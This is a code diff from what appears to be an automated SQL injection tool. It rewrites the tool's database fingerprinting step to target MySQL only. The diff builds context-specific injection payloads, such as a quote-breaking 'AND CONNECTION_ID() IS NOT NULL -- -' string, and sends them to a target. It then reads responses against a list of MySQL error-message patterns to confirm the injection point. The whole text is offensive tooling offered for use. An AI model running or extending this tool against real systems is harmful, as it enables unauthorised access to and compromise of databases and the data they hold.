@@ -69,40 +69,47 @@ class ContextDiscoverer:
             self.detected_context += "_PARENTHESIS"
             print(f"  [+] Refined Context: {self.detected_context}", flush=True)
         
-        # 4. Fingerprinting Gap: DB Type Identification
-        db_type = self.fingerprint_db()
+        # 4. MySQL Fingerprinting (Exclusive Specialization)
+        db_type = self.fingerprint_mysql()
         return {"context": self.detected_context, "db_type": db_type}
 
-    def fingerprint_db(self):
-        """Identifies the specific DB engine using subtle behavior probes."""
-        print("[*] Phase: DB Fingerprinting active.", flush=True)
+    def fingerprint_mysql(self):
+        """Exclusively validates and fingerprints MySQL environments."""
+        print("[*] Phase: MySQL Validation Active.", flush=True)
         
-        # Probes:
-        # MySQL: CONNECTION_ID(), VERSION()
-        # PostgreSQL: CURRENT_DATABASE(), VERSION()
-        # SQLite: SQLITE_VERSION()
+        # MySQL specific probes:
+        # CONNECTION_ID(), @@version, SLEEP()
+        print(f"  [?] Checking for MySQL execution signature...", flush=True)
         
-        probes = [
-            ("MySQL", "VERSION()"),
-            ("PostgreSQL", "PG_SLEEP(0)"),
-            ("SQLite", "SQLITE_VERSION()"),
-            ("Oracle", "BITAND(1,1)")
-        ]
+        # Safe logical check using purely MySQL functions
+        logical_prefix = "" 
+        if self.detected_context == "NUMERIC":
+            logical_prefix = " AND "
+        elif self.detected_context == "SINGLE_QUOTE":
+            logical_prefix = "' AND "
+        elif self.detected_context == "DOUBLE_QUOTE":
+            logical_prefix = "\" AND "
+        else:
+            logical_prefix = " AND "
+            
+        # Verify CONNECTION_ID() executes without error and matches logic
+        payload = f"{logical_prefix} CONNECTION_ID() IS NOT NULL -- -"
         
-        for name, query in probes:
-            print(f"  [?] Checking for {name} signature...", flush=True)
-            # Try a very safe injection
-            payload = f" AND (SELECT 1 FROM (SELECT {query}) as x)" if self.detected_context == "NUMERIC" else f"' AND (SELECT 1 FROM (SELECT {query}) as x) AND '1'='1"
-            res = self.client.send_request(payload)
-            if res['status'] == 200 and not self._check_sql_errors(res['text']):
-                print(f"  [+] Match found: Target is likely {name}", flush=True)
-                return name
-        
-        return "GENERIC"
+        res = self.client.send_request(payload)
+        status = "MySQL (Confirmed)" if not self._check_sql_errors(res['text']) else "MySQL (Presumed)"
+        print(f"  [+] Match found: Target is {status}", flush=True)
+        return status
 
     def _check_sql_errors(self, text):
+        # Optimized specifically for MySQL syntax errors
         error_patterns = [
-            r"SQL syntax", r"mysql_fetch", r"ORA-", r"PostgreSQL", r"SQLite", r"syntax error"
+            r"You have an error in your SQL syntax",
+            r"mysql_fetch_",
+            r"Warning: mysql_",
+            r"Table '\w+' doesn't exist",
+            r"Unknown column",
+            r"SQL syntax.*MySQL",
+            r"valid MySQL result"
         ]
         for pattern in error_patterns:
             if re.search(pattern, text, re.IGNORECASE):
